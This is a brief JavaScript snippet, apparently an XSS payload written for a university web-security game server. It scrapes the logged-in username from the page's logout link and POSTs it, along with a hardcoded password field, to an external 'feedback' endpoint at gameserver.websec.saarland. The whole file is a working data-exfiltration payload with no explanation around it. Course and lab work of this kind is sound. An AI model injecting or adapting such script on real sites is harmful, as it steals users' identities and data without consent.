var username = document.getElementById("logout").innerHTML.match(/Logout (.*)/)[1];

var xhr = new XMLHttpRequest();

xhr.open("POST", "https://gameserver.websec.saarland/feedback/16", true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("password=avalz&secret=" + username);
